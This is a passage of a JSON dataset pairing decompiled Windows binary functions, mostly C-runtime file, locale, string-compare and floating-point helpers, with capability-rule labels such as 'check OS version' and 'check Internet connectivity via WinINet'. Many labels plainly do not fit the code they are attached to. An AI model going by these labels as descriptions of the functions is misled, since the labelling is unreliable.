        "decompiled_code": "\nuint fcn.004171cf(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_10h;\n    \n    uVar2 = 0;\n    if (((param_1[3] & 3) == 2) && ((param_1[3] & 0x108U) != 0)) {\n        arg_10h = *param_1 - param_1[2];\n        if (0 < arg_10h) {\n            iVar1 = fcn.00415a79(param_1[4], param_1[2], arg_10h);\n            if (iVar1 == arg_10h) {\n                if (param_1[3] < '\\0') {\n                    param_1[3] = param_1[3] & 0xfffffffd;\n                }\n            }\n            else {\n                param_1[3] = param_1[3] | 0x20;\n                uVar2 = 0xffffffff;\n            }\n        }\n    }\n    param_1[1] = 0;\n    *param_1 = param_1[2];\n    return uVar2;\n}\n",
        "token_count": 259
    },
    "00417338": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpBuffer\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00417338(uint32_t arg_8h, char *arg_ch, char *nNumberOfBytesToRead)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    char *pcVar8;\n    int32_t iVar9;\n    int32_t lpNumberOfBytesRead;\n    char *var_8h;\n    uint lpBuffer;\n    \n    var_8h = NULL;\n    if (nNumberOfBytesToRead != NULL) {\n        piVar1 = (arg_8h >> 5) * 4 + 0x452680;\n        iVar9 = (arg_8h & 0x1f) * 0x24;\n        uVar3 = *(*piVar1 + iVar9 + 4);\n        if ((uVar3 & 2) == 0) {\n            pcVar8 = arg_ch;\n            if (((uVar3 & 0x48) != 0) && (*(*piVar1 + iVar9 + 5) != '\\n')) {\n                nNumberOfBytesToRead = nNumberOfBytesToRead + -1;\n                *arg_ch = *(*piVar1 + 5 + iVar9);\n                pcVar8 = arg_ch + 1;\n                var_8h = 0x1;\n                *(*piVar1 + 5 + iVar9) = 10;\n            }\n            iVar6 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                              (*(*piVar1 + iVar9), pcVar8, nNumberOfBytesToRead, &lpNumberOfBytesRead, 0);\n            if (iVar6 == 0) {\n                iVar9 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                if (iVar9 == 5) {\n                    puVar7 = fcn.0040adb0();\n                    *puVar7 = 9;\n                    puVar7 = fcn.0040adb9();\n                    *puVar7 = 5;\n                }\n                else {\n                    if (iVar9 == 0x6d) {\n                        return 0;\n                    }\n                    fcn.0040adc2(iVar9);\n                }\n                return -1;\n            }\n            if ((*(*piVar1 + 4 + iVar9) & 0x80) == 0) {\n                return var_8h + lpNumberOfBytesRead;\n            }\n            if ((lpNumberOfBytesRead == 0) || (*arg_ch != '\\n')) {\n                puVar2 = *piVar1 + 4 + iVar9;\n                *puVar2 = *puVar2 & 0xfb;\n            }\n            else {\n                puVar2 = *piVar1 + 4 + iVar9;\n                *puVar2 = *puVar2 | 4;\n            }\n            var_8h = arg_ch + var_8h + lpNumberOfBytesRead;\n            nNumberOfBytesToRead = arg_ch;\n            pcVar8 = arg_ch;\n            if (arg_ch < var_8h) {\n                do {\n                    cVar4 = *nNumberOfBytesToRead;\n                    if (cVar4 == '\\x1a') {\n                        if ((*(*piVar1 + 4 + iVar9) & 0x40) == 0) {\n                            puVar2 = *piVar1 + 4 + iVar9;\n                            *puVar2 = *puVar2 | 2;\n                        }\n                        break;\n                    }\n                    if (cVar4 == '\\r') {\n                        if (nNumberOfBytesToRead < var_8h + -1) {\n                            if (nNumberOfBytesToRead[1] == '\\n') {\n                                pcVar5 = nNumberOfBytesToRead + 2;\n                                goto code_r0x004174c5;\n                            }\ncode_r0x004174df:\n                            nNumberOfBytesToRead = nNumberOfBytesToRead + 1;\n                            *pcVar8 = '\\r';\n                        }\n                        else {\n                            pcVar5 = nNumberOfBytesToRead + 1;\n                            iVar6 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                                              (*(*piVar1 + iVar9), &lpBuffer, 1, &lpNumberOfBytesRead, 0);\n                            if (((iVar6 == 0) && (iVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar6 != 0)) ||\n                               (lpNumberOfBytesRead == 0)) goto code_r0x004174df;\n                            if ((*(*piVar1 + 4 + iVar9) & 0x48) == 0) {\n                                if ((pcVar8 == arg_ch) && (lpBuffer == '\\n')) goto code_r0x004174c5;\n                                fcn.0041578c(arg_8h, 0xffffffff, 1);\n                                if (lpBuffer == '\\n') goto code_r0x004174e3;\n                                goto code_r0x004174df;\n                            }\n                            if (lpBuffer == '\\n') {\ncode_r0x004174c5:\n                                nNumberOfBytesToRead = pcVar5;\n                                *pcVar8 = '\\n';\n                            }\n                            else {\n                                *pcVar8 = '\\r';\n                                *(*piVar1 + 5 + iVar9) = lpBuffer;\n                                nNumberOfBytesToRead = pcVar5;\n                            }\n                        }\n                        pcVar8 = pcVar8 + 1;\n                        pcVar5 = nNumberOfBytesToRead;\n                    }\n                    else {\n                        *pcVar8 = cVar4;\n                        pcVar8 = pcVar8 + 1;\n                        pcVar5 = nNumberOfBytesToRead + 1;\n                    }\ncode_r0x004174e3:\n                    nNumberOfBytesToRead = pcVar5;\n                } while (nNumberOfBytesToRead < var_8h);\n            }\n            return pcVar8 - arg_ch;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1322
    },
    "004175be": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004175be(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    \n    iVar1 = fcn.0040eadd();\n    iVar1 = *(iVar1 + 0x60);\n    if (iVar1 != *0x4527c0) {\n        iVar1 = fcn.0040bf99();\n    }\n    if (arg_10h == 0) {\n        return 0;\n    }\n    iVar1 = fcn.00417d9e(*(iVar1 + 0xc), 1, arg_8h, arg_10h, arg_ch, arg_10h, *(iVar1 + 4), unaff_EBP, unaff_retaddr, \n                         arg_8h, arg_ch, arg_10h, in_stack_00000010, in_stack_00000014, in_stack_00000018, \n                         in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c, \n                         in_stack_00000030, in_stack_00000034, in_stack_00000038, in_stack_0000003c, in_stack_00000040, \n                         in_stack_00000044, in_stack_00000048, in_stack_0000004c, in_stack_00000050);\n    if (iVar1 == 0) {\n        return 0x7fffffff;\n    }\n    return iVar1 + -2;\n}\n",
        "token_count": 514
    },
    "0041769c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_24h_2\n// WARNING: Variable defined which should be unmapped: var_20h_2\n// WARNING: Variable defined which should be unmapped: var_1ch_2\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl\nfcn.0041769c(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint CodePage, uint noname_5, uint arg_8h, \n            uint arg_ch, uint noname_8, uint noname_9, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uchar *arg_8h_00;\n    int32_t unaff_EBP;\n    uint Locale;\n    uint LCType;\n    uint lpLCData;\n    uint cchData;\n    uint var_34h;\n    uint uVar2;\n    uint var_28h;\n    uint var_24h_2;\n    uint var_20h_2;\n    uint var_1ch_2;\n    uint uStack24;\n    uint uStack20;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    \n    var_18h = 0x18;\n    var_1ch = 0x445318;\n    var_20h = 0x4176a8;\n    fcn.0040bc40();\n    if (*0x4514d0 == 0) {\n        var_20h = 0;\n        var_24h = 0;\n        uStack20 = 1;\n        uStack24 = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n        if (iVar1 == 0) {\n            var_20h = 0x4176d1;\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x4514d0 = 2;\n            }\n        }\n        else {\n            *0x4514d0 = 1;\n        }\n    }\n    if (*0x4514d0 == 1) {\n        var_20h = *(unaff_EBP + 0x14);\n        var_24h = *(unaff_EBP + 0x10);\n        uStack20 = *(unaff_EBP + 0xc);\n        uStack24 = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n    }\n    else if ((*0x4514d0 == 2) || (*0x4514d0 == 0)) {\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -0x24) = 0;\n        if (*(unaff_EBP + 0x18) == 0) {\n            *(unaff_EBP + 0x18) = *0x451358;\n        }\n        var_20h = 0;\n        var_24h = 0;\n        uStack20 = *(unaff_EBP + 0xc);\n        uStack24 = *(unaff_EBP + 8);\n        arg_8h_00 = &stack0xffffffe8;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)();\n        *(unaff_EBP + -0x20) = iVar1;\n        if (iVar1 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.0040a2a0();\n            *(unaff_EBP + -0x18) = &stack0xffffffe8;\n            *(unaff_EBP + -0x28) = &stack0xffffffe8;\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x18) {\n                arg_8h_00 = fcn.00409f36(*(unaff_EBP + -0x20));\n                if (arg_8h_00 == NULL) goto code_r0x004177c3;\n                *(unaff_EBP + -0x24) = 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)\n                              (*(unaff_EBP + 8), *(unaff_EBP + 0xc), arg_8h_00, *(unaff_EBP + -0x20));\n            if (iVar1 != 0) {\n                if (*(unaff_EBP + 0x14) == 0) {\n                    var_28h = 0;\n                    uVar2 = 0;\n                }\n                else {\n                    var_28h = *(unaff_EBP + 0x14);\n                    uVar2 = *(unaff_EBP + 0x10);\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                  (*(unaff_EBP + 0x18), 1, arg_8h_00, 0xffffffff, uVar2, var_28h);\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            if (*(unaff_EBP + -0x24) != 0) {\n                fcn.00409f48(arg_8h_00);\n            }\n        }\n    }\ncode_r0x004177c3:\n    *(unaff_EBP + -0x38) = 0x4177cb;\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 1259
    },
    "004177cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_24h_2\n// WARNING: Variable defined which should be unmapped: var_20h_2\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl\nfcn.004177cc(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint CodePage, uint noname_5, uint Locale, \n            uint LCType, uint lpLCData, uint cchData, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uchar *arg_8h;\n    int32_t unaff_EBP;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    uint var_4h;\n    uint uVar2;\n    uint uVar3;\n    uint var_28h;\n    uint var_24h_2;\n    uint var_20h_2;\n    uint var_34h;\n    uint uStack24;\n    uint uStack20;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    \n    var_18h = 0x18;\n    var_1ch = 0x445328;\n    var_20h = 0x4177d8;\n    fcn.0040bc40();\n    if (*0x4514d4 == 0) {\n        var_20h = 0;\n        var_24h = 0;\n        uStack20 = 1;\n        uStack24 = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n        if (iVar1 == 0) {\n            var_20h = 0x417801;\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x4514d4 = 2;\n            }\n        }\n        else {\n            *0x4514d4 = 1;\n        }\n    }\n    if ((*0x4514d4 == 2) || (*0x4514d4 == 0)) {\n        var_20h = *(unaff_EBP + 0x14);\n        var_24h = *(unaff_EBP + 0x10);\n        uStack20 = *(unaff_EBP + 0xc);\n        uStack24 = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)();\n    }\n    else if (*0x4514d4 == 1) {\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -0x20) = 0;\n        if (*(unaff_EBP + 0x18) == 0) {\n            *(unaff_EBP + 0x18) = *0x451358;\n        }\n        var_20h = 0;\n        var_24h = 0;\n        uStack20 = *(unaff_EBP + 0xc);\n        uStack24 = *(unaff_EBP + 8);\n        arg_8h = &stack0xffffffe8;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n        *(unaff_EBP + -0x24) = iVar1;\n        if (iVar1 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.0040a2a0();\n            *(unaff_EBP + -0x18) = &stack0xffffffe8;\n            *(unaff_EBP + -0x28) = &stack0xffffffe8;\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x18) {\n                arg_8h = fcn.00409f36(iVar1 * 2);\n                if (arg_8h == NULL) goto code_r0x00417903;\n                *(unaff_EBP + -0x20) = 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)(*(unaff_EBP + 8), *(unaff_EBP + 0xc), arg_8h, iVar1);\n            if (iVar1 != 0) {\n                if (*(unaff_EBP + 0x14) == 0) {\n                    uVar3 = 0;\n                    uVar2 = 0;\n                }\n                else {\n                    uVar3 = *(unaff_EBP + 0x14);\n                    uVar2 = *(unaff_EBP + 0x10);\n                }\n                uVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                  (*(unaff_EBP + 0x18), 0, arg_8h, 0xffffffff, uVar2, uVar3, 0, 0);\n                *(unaff_EBP + -0x1c) = uVar3;\n            }\n            if (*(unaff_EBP + -0x20) != 0) {\n                fcn.00409f48(arg_8h);\n            }\n        }\n    }\ncode_r0x00417903:\n    *(unaff_EBP + -0x38) = 0x41790b;\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 1209
    },
    "00417971": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00417971(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    int32_t *piVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    uint16_t uVar6;\n    uint32_t uVar7;\n    uint16_t uVar8;\n    int32_t var_28h;\n    uint16_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar3 = arg_ch;\n    var_4h = *0x44e0fc;\n    var_1ch = 0;\n    var_10h._0_1_ = 0;\n    var_10h._1_1_ = 0;\n    var_10h._2_2_ = 0;\n    var_ch._0_2_ = 0;\n    var_ch._2_2_ = 0;\n    var_8h._0_2_ = 0;\n    var_8h._2_1_ = 0;\n    var_8h._3_1_ = 0;\n    uVar6 = *(arg_ch + 10) & 0x7fff;\n    uVar4 = *(arg_8h + 10) & 0x7fff;\n    uVar8 = (*(arg_ch + 10) ^ *(arg_8h + 10)) & 0x8000;\n    uVar2 = uVar6 + uVar4;\n    if (((uVar4 < 0x7fff) && (uVar6 < 0x7fff)) && (uVar2 < 0xbffe)) {\n        if (uVar2 < 0x3fc0) {\ncode_r0x00417a1e:\n            arg_8h[2] = 0;\n            arg_8h[1] = 0;\n            *arg_8h = 0;\n            goto code_r0x00417b96;\n        }\n        if (uVar4 == 0) {\n            uVar2 = uVar2 + 1;\n            arg_8h._0_2_ = 0;\n            if ((((arg_8h[2] & 0x7fffffffU) != 0) || (arg_8h[1] != 0)) || (*arg_8h != 0)) goto code_r0x00417a08;\n        }\n        else {\ncode_r0x00417a08:\n            if (((uVar6 == 0) && (uVar2 = uVar2 + 1,  (arg_ch[2] & 0x7fffffffU) == 0)) &&\n               ((arg_ch[1] == 0 && (*arg_ch == 0)))) goto code_r0x00417a1e;\n            var_18h = 0;\n            var_14h = &var_ch;\n            arg_ch = 0x5;\n            do {\n                if (0 < arg_ch) {\n                    var_24h = var_18h * 2 + arg_8h;\n                    var_20h = piVar3 + 2;\n                    var_28h = arg_ch;\n                    do {\n                        iVar5 = fcn.004166b5(var_14h[-1], *var_20h * *var_24h, var_14h + -1);\n                        if (iVar5 != 0) {\n                            *var_14h = *var_14h + 1;\n                        }\n                        var_24h = var_24h + 1;\n                        var_20h = var_20h + -2;\n                        var_28h = var_28h + -1;\n                    } while (var_28h != 0);\n                }\n                var_14h = var_14h + 2;\n                var_18h = var_18h + 1;\n                arg_ch = arg_ch + -1;\n            } while (0 < arg_ch);\n            arg_8h._0_2_ = uVar2 + 0xc002;\n            if (arg_8h < 1) {\ncode_r0x00417ad2:\n                arg_8h._0_2_ = arg_8h - 1;\n                if (arg_8h < 0) {\n                    uVar7 = -arg_8h;\n                    arg_8h._0_2_ = 0;\n                    do {\n                        if ((var_10h & 1) != 0) {\n                            var_1ch = var_1ch + 1;\n                        }\n                        fcn.00416762(&var_10h);\n                        uVar7 = uVar7 - 1;\n                    } while (uVar7 != 0);\n                    if (var_1ch != 0) {\n                        var_10h._0_1_ = var_10h | 1;\n                    }\n                }\n            }\n            else {\n                do {\n                    if ((var_8h._3_1_ & 0x80) != 0) break;\n                    fcn.00416734(&var_10h);\n                    arg_8h._0_2_ = arg_8h - 1;\n                } while (0 < arg_8h);\n                if (arg_8h < 1) goto code_r0x00417ad2;\n            }\n            if ((0x8000 < CONCAT11(var_10h._1_1_, var_10h)) ||\n               ((CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) & 0x1ffff) == 0x18000)) {\n                if (CONCAT22(var_ch, var_10h._2_2_) == -1) {\n                    var_10h._2_2_ = 0;\n                    var_ch._0_2_ = 0;\n                    if (CONCAT22(var_8h, var_ch._2_2_) == -1) {\n                        var_ch._2_2_ = 0;\n                        var_8h._0_2_ = 0;\n                        if (CONCAT11(var_8h._3_1_, var_8h._2_1_) == -1) {\n                            arg_8h._0_2_ = arg_8h + 1;\n                            var_8h._2_1_ = 0;\n                            var_8h._3_1_ = 0x80;\n                        }\n                        else {\n                            iVar1 = CONCAT11(var_8h._3_1_, var_8h._2_1_) + 1;\n                            var_8h._2_1_ = iVar1;\n                            var_8h._3_1_ = iVar1 >> 8;\n                        }\n                    }\n                    else {\n                        iVar5 = CONCAT22(var_8h, var_ch._2_2_) + 1;\n                        var_ch._2_2_ = iVar5;\n                        var_8h._0_2_ = iVar5 >> 0x10;\n                    }\n                }\n                else {\n                    iVar5 = CONCAT22(var_ch, var_10h._2_2_) + 1;\n                    var_10h._2_2_ = iVar5;\n                    var_ch._0_2_ = iVar5 >> 0x10;\n                }\n            }\n            if (0x7ffe < arg_8h) goto code_r0x00417b7b;\n            *arg_8h = var_10h._2_2_;\n            *(arg_8h + 2) = CONCAT22(var_ch._2_2_, var_ch);\n            *(arg_8h + 6) = CONCAT13(var_8h._3_1_, CONCAT12(var_8h._2_1_, var_8h));\n            arg_8h._0_2_ = arg_8h | uVar8;\n        }\n        *(arg_8h + 10) = arg_8h;\n    }\n    else {\ncode_r0x00417b7b:\n        arg_8h[1] = 0;\n        *arg_8h = 0;\n        arg_8h[2] = (-(uVar8 != 0) & 0x80000000) + 0x7fff8000;\n    }\ncode_r0x00417b96:\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 1915
    },
    "00417cc6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00417cc6(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040bc40(0x445348, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x452678) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x452680;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.00416fef(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\ncode_r0x00417d46:\n                puVar3 = fcn.0040adb0();\n                *puVar3 = 9;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.00416fae(arg_8h_00);\n                iVar4 = (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(uVar2);\n                if (iVar4 == 0) {\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    *(unaff_EBP + -0x1c) = uVar2;\n                }\n                else {\n                    *(unaff_EBP + -0x1c) = 0;\n                }\n                if (*(unaff_EBP + -0x1c) != 0) {\n                    puVar3 = fcn.0040adb9();\n                    *puVar3 = *(unaff_EBP + -0x1c);\n                    goto code_r0x00417d46;\n                }\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00417d66();\n            goto code_r0x00417d7c;\n        }\n    }\n    puVar3 = fcn.0040adb0();\n    *puVar3 = 9;\ncode_r0x00417d7c:\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 587
    },
    "00417d82": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.00417d82(int32_t param_1)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = param_1;\n    if (param_1 != 0) {\n        do {\n            iVar1 = iVar1 + -1;\n            if (*in_EAX == '\\0') goto code_r0x00417d96;\n            in_EAX = in_EAX + 1;\n        } while (iVar1 != 0);\n    }\n    iVar1 = iVar1 + -1;\ncode_r0x00417d96:\n    return (param_1 - iVar1) + -1;\n}\n",
        "token_count": 144
    },
    "00417d9e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_44h_2\n// WARNING: Variable defined which should be unmapped: var_40h_3\n// WARNING: Variable defined which should be unmapped: var_3ch_3\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_40h_2\n// WARNING: Variable defined which should be unmapped: var_3ch_2\n// WARNING: Variable defined which should be unmapped: var_5ch\n\nvoid __cdecl\nfcn.00417d9e(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint arg_8h, uint arg_ch, uint lpMultiByteStr, uint cbMultiByte, \n            uint lpString2, uint cchCount2, uint CodePage)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint8_t *puVar4;\n    uint *arg_8h_00;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    int32_t iVar6;\n    uint Locale;\n    uint dwCmpFlags;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint lpCPInfo;\n    uint var_4h_2;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_18h_2;\n    uint var_1ch_2;\n    uint var_20h;\n    uint var_4h;\n    uint var_50h;\n    uint var_44h_2;\n    uint var_40h_3;\n    uint var_3ch_3;\n    uint lpString1;\n    uint var_30h_2;\n    uchar auStack48 [2];\n    uint var_2ah;\n    int32_t var_4ch;\n    uint var_40h_2;\n    uint var_3ch_2;\n    uint var_5ch;\n    uint uVar7;\n    \n    uVar7 = 0x40;\n    fcn.0040bc40();\n    *(unaff_EBP + -0x1c) = *0x44e0fc;\n    iVar6 = 0;\n    if (*0x4514d8 == 0) {\n        var_4ch = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_CompareStringW)();\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar2 == 0x78) {\n                *0x4514d8 = 2;\n            }\n        }\n        else {\n            *0x4514d8 = 1;\n        }\n    }\n    if (0 < *(unaff_EBP + 0x14)) {\n        uVar3 = fcn.00417d82();\n        *(unaff_EBP + 0x14) = uVar3;\n    }\n    iVar2 = *(unaff_EBP + 0x1c);\n    if (0 < iVar2) {\n        iVar2 = fcn.00417d82();\n        *(unaff_EBP + 0x1c) = iVar2;\n    }\n    if ((*0x4514d8 == 2) || (*0x4514d8 == 0)) {\n        *(unaff_EBP + -0x38) = 0;\n        if (*(unaff_EBP + 8) == 0) {\n            *(unaff_EBP + 8) = *0x451348;\n        }\n        iVar2 = *(unaff_EBP + 0x20);\n        if (*(unaff_EBP + 0x20) == 0) {\n            iVar2 = *0x451358;\n        }\n        iVar5 = fcn.00415dde(*(unaff_EBP + 8));\n        if (iVar5 == -1) goto code_r0x00418111;\n        if (iVar5 != iVar2) {\n            var_4ch = iVar2;\n            iVar6 = fcn.00415e21(iVar2, iVar5, *(unaff_EBP + 0x10), unaff_EBP + 0x14, 0, 0, 0x445358, uVar7);\n            if (iVar6 == 0) goto code_r0x00418111;\n            var_4ch = iVar2;\n            iVar2 = fcn.00415e21(iVar2, iVar5, *(unaff_EBP + 0x18), unaff_EBP + 0x1c, 0, 0, 0x445358, uVar7);\n            *(unaff_EBP + -0x38) = iVar2;\n            if (iVar2 == 0) {\n                fcn.00409f48(iVar6);\n                goto code_r0x00418111;\n            }\n            *(unaff_EBP + 0x10) = iVar6;\n            *(unaff_EBP + 0x18) = *(unaff_EBP + -0x38);\n        }\n        var_4ch = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_CompareStringA)();\n        if (iVar6 != 0) {\n            fcn.00409f48(iVar6);\n            stack0xffffffd4 = 0x41810d;\n            fcn.00409f48(*(unaff_EBP + -0x38));\n        }\n        goto code_r0x00418111;\n    }\n    if (*0x4514d8 != 1) goto code_r0x00418111;\n    *(unaff_EBP + -0x3c) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    *(unaff_EBP + -0x40) = 0;\n    if (*(unaff_EBP + 0x20) == 0) {\n        *(unaff_EBP + 0x20) = *0x451358;\n    }\n    if ((*(unaff_EBP + 0x14) == 0) || (iVar2 == 0)) {\n        if ((*(unaff_EBP + 0x14) == iVar2) ||\n           (((1 < iVar2 || (1 < *(unaff_EBP + 0x14))) || (iVar6 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(),  iVar6 == 0))))\n        goto code_r0x00418111;\n        if (0 < *(unaff_EBP + 0x14)) {\n            if (1 < *(unaff_EBP + -0x30)) {\n                puVar4 = unaff_EBP + -0x2a;\n                uVar1 = *(unaff_EBP + -0x2a);\n                while (((uVar1 != 0 && (puVar4[1] != 0)) &&\n                       ((**(unaff_EBP + 0x10) < *puVar4 || (puVar4[1] < **(unaff_EBP + 0x10)))))) {\n                    puVar4 = puVar4 + 2;\n                    uVar1 = *puVar4;\n                }\n            }\n            goto code_r0x00418111;\n        }\n        if (0 < *(unaff_EBP + 0x1c)) {\n            if (1 < *(unaff_EBP + -0x30)) {\n                puVar4 = 